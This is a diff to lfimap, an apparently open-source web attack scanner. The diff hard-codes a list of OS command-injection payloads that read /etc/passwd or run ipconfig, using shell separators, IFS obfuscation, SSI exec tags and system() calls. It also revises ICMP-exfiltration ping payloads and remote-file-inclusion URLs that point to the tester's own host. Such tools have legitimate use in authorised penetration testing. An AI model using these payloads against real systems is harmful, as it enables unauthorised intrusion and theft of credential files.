@@ -192,15 +192,16 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
 
     #Add them from the most complex one to the least complex. This is important.
     TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "aahgpz\"ptz>e<atzf", 
-                  "Windows/System32/drivers/etc/hosts", "cat%20/etc/passwd|head%20-n%201", 
-                  "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd", 
+                  "Windows/System32/drivers/etc/hosts", "cat%24IFS%2Fetc%2Fpasswd",
+                  "cat${IFS%??}/etc/passwd", "cat%20%2Fetc%2Fpasswd", "/sbin/cat%20/etc/passwd",
+                  "/sbin/cat /etc/passwd", "system('cat%20/etc/passwd')", "system%28%27ipconfig",
                   "%windir%\System32\drivers\etc\hosts", "C:\Windows\System32\drivers\etc\hosts",
                   "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
-                  "cat%20/etc/passwd", "cat%20/etc/group", "/etc/passwd",
+                  "cat%20/etc/passwd", "cat /etc/passwd", "/etc/passwd",
                   "file://C:\Windows\System32\drivers\etc\hosts", 
                   "Windows%5CSystem32%5Cdrivers%5Cetc%5Chosts","Windows\\System32\\drivers\\etc\\hosts",
-                  "/etc/passwd","https://www.google.com/", "/rfitest", "ipconfig"
-                  "/961bb08a95dbc34397248d92352da799", "/exploit", "/.php.txt", "/.php"]
+                  "/ysvznc", "ipconfig",
+                  "/961bb08a95dbc34397248d92352da799", "/.php.txt", "/.php"]
     
     if(scriptName != ""):
         TO_REPLACE.append(scriptName)
@@ -214,7 +215,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
         TO_REPLACE.append("ping -n 1 " + args.lhost)
         TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
         TO_REPLACE.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
-
+    
     if(checkPayload(req) or cmdInjectable):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
@@ -295,22 +296,56 @@ def test_cmd_injection(url):
     if(args.verbose):
         print("[i] Testing for classic results-based os command injection...")
     
-    if(not args.postreq):
-        with open(cmdWordlist) as f:
-            for line in f:
-                line = line.replace("\n", "")
-                u = url.replace(args.param, line)
-
-                _, br = GET(u, headers, proxies, "RCE", "CMD")
-                if(not br): return
-    else:
-        with open(cmdWordlist) as f:
-            for line in f:
-                line = line.replace("\n", "")
-                
-                postTest = args.postreq.replace(args.param, line)
-                _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
-                if(not br): return
+    cmdList = []
+    cmdList.append("||cat /etc/passwd||")
+    cmdList.append(";cat /etc/passwd;")
+    cmdList.append("&&cat /etc/passwd||")
+    cmdList.append("%3Bcat%20/etc/passwd")
+    cmdList.append("%26%26cat%20/etc/passwd")
+    cmdList.append("%26cat%20/etc/passwd")
+    cmdList.append("%7C%7Ccat%20/etc/passwd%3B")
+    cmdList.append("%7C%7Ccat%20/etc/passwd%7C")
+    cmdList.append("1;cat${IFS%??}/etc/passwd;")
+    cmdList.append("%3Bcat%24IFS%2Fetc%2Fpasswd%3B")
+    cmdList.append("printf%20%60cat%20%2Fetc%2Fpasswd%60")
+    cmdList.append("&lt;!--#exec%20cmd=&quot;cat%20/etc/passwd&quot;--&gt;")
+    cmdList.append("&lt;!--#exec%20cmd=&quot;ipconfig&quot;--&gt;")
+    cmdList.append('<!--#exec cmd="cat /etc/passwd"-->')
+    cmdList.append('<!--#exec cmd="ipconfig"-->')
+    cmdList.append("\n/sbin/cat /etc/passwd\n")    
+    cmdList.append(";/sbin/cat /etc/passwd\n")
+    cmdList.append("a);cat /etc/passwd;")
+    cmdList.append(";system('cat%20/etc/passwd')")
+    cmdList.append("%3Bsystem%28%27ipconfig%27%29")
+    cmdList.append("%3Bsystem%28%27ipconfig%27%29%3B")
+    cmdList.append("%0Acat%20/etc/passwd")
+    cmdList.append("%0Acat%20/etc/passwd%0A")
+    cmdList.append("$;/sbin/cat /etc/passwd||")
+    cmdList.append("%0A%0Dcat%20/etc/passwd%0A%0D")
+    cmdList.append("$(`cat /etc/passwd`)")
+    cmdList.append(";ipconfig;")
+    cmdList.append("||ipconfig||")
+    cmdList.append("&&ipconfig&&")
+    cmdList.append("%3Bipconfig")
+    cmdList.append("%3Bipconfig%3B")
+    cmdList.append("%3B%3Bipconfig%3B%3B")
+    cmdList.append("%26ipconfig")
+    cmdList.append("%26ipconfig%26")
+    cmdList.append("%26%26ipconfig%26%26")
+    cmdList.append("%7Cipconfig")
+    cmdList.append("%7Cipconfig%7C")
+    cmdList.append("%7C%7Cipconfig%7C%7C")
+    
+    for test in cmdList:
+        if(not args.postreq):
+            u = url.replace(args.param, test)
+            _, br = GET(u, headers, proxies, "RCE", "CMD")
+            if(not br): return
+    
+        else:
+            postTest = args.postreq.replace(args.param, test)
+            _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
+            if(not br): return
 
      # ICMP exfiltration technique
     if(args.lhost):
@@ -321,10 +356,10 @@ def test_cmd_injection(url):
         t.start()
 
         icmpTests = []
-        icmpTests.append(";ping%20-c%201%20" + args.lhost)
-        icmpTests.append(";ping%20-n%201%20" + args.lhost)
-        icmpTests.append("test%3Bping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
-        icmpTests.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
+        icmpTests.append(";ping%20-c%201;" + args.lhost)
+        icmpTests.append(";ping%20-n%201;" + args.lhost)
+        icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
+        icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
         
         for test in icmpTests:
             if(args.postreq):
@@ -508,17 +543,17 @@ def test_rfi(url):
 
             threading.Thread(target=serve_forever).start()
             rfiTest = []
-            rfiTest.append("http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port)))
-            rfiTest.append("http://{0}:{1}/rfitest%00".format(args.lhost, str(rfi_test_port)))
+            rfiTest.append("http://{0}:{1}/ysvznc".format(args.lhost, str(rfi_test_port)))
+            rfiTest.append("http://{0}:{1}/ysvznc%00".format(args.lhost, str(rfi_test_port)))
             rfiTest.append("http://{0}:{1}/.php".format(args.lhost, str(rfi_test_port))) 
             rfiTest.append("http://{0}:{1}/.php.txt".format(args.lhost, str(rfi_test_port))) 
             rfiTest.append("http://{0}:{1}/961bb08a95dbc34397248d92352da799".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.gif".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.png".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.jpg".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.jsp".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.html".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/exploit.php".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.gif".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.png".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.jpg".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.jsp".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.html".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/ysvznc.php".format(args.lhost, str(rfi_test_port))) 
 
             for test in rfiTest:
                 u = url.replace(args.param, test)
@@ -747,7 +782,7 @@ def checkPayload(webResponse):
                 "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
-                "window.google=", "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
+                "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
                 "PCFET0N", "PGh0b"]
     
     for word in KEY_WORDS:
@@ -1602,9 +1637,9 @@ if(__name__ == "__main__"):
     payloadGroup.add_argument('--lport', type=int, metavar='<lport>', dest='lport', help='\t\t Specify local port number for reverse connection')
     
     wordlistGroup = parser.add_argument_group('WORDLIST OPTIONS')
-    wordlistGroup.add_argument('-wT', type=str, metavar = '<path>', dest='truncWordlist', help='\t\t Specify wordlist for truncation test')
-    wordlistGroup.add_argument("-wC", type=str, metavar= '<path>', dest='cmdWordlist', help='\t\t Specify wordlist for command injection test')
-    
+    wordlistGroup.add_argument('-wT', type=str, metavar = '<path>', dest='truncWordlist', help='\t\t Specify path to wordlist for truncation test modality')
+    wordlistGroup.add_argument('--use-long', action='store_true', dest='uselong', help='\t\t Use "wordlists/long.txt" wordlist for truncation test modality')
+
     otherGroup = parser.add_argument_group('OTHER')
     otherGroup.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='\t\t Print more detailed output when performing attacks\n')
     otherGroup.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='\t\t Print this help message\n\n')
@@ -1613,7 +1648,6 @@ if(__name__ == "__main__"):
     url = args.url
     urlfile = args.f
     truncWordlist = args.truncWordlist
-    cmdWordlist = args.cmdWordlist
     agent = args.agent
     referer = args.referer
    
@@ -1687,20 +1721,10 @@ if(__name__ == "__main__"):
             print("[-] Specified truncation wordlist '" + truncWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        truncWordlist = scriptDirectory + separator + "wordlists" + os.sep + "short.txt"
+        if(args.uselong): truncWordlist = scriptDirectory + separator + "wordlists" + separator + "long.txt" 
+        else: truncWordlist = scriptDirectory + separator + "wordlists" + separator + "short.txt"
         if((not os.path.exists(truncWordlist)) and (args.test_all or args.trunc)):
             print("[-] Cannot locate " + truncWordlist + " wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
-            sys.exit(-1)
-    
-    #Check if provided cmd injection wordlist exists
-    if(cmdWordlist is not None):
-        if(not os.path.isfile(cmdWordlist)):
-            print("[-] Specified command injection wordlist '" + cmdWordlist + "' doesn't exist. Exiting...")
-            sys.exit(-1)
-    else:
-        cmdWordlist = scriptDirectory + separator + "wordlists" + os.sep + "cmdInjection.txt"
-        if((not os.path.exists(cmdWordlist)) and (args.test_all or args.cmd)):
-            print("[-] Cannot locate " + cmdWordlist + " wordlist. Since '-a' or '--cmdinject' is specified, lfimap will exit...")
             sys.exit(-1)
 
     #Checks if '--lhost' and '--lport' are provided with '-x'
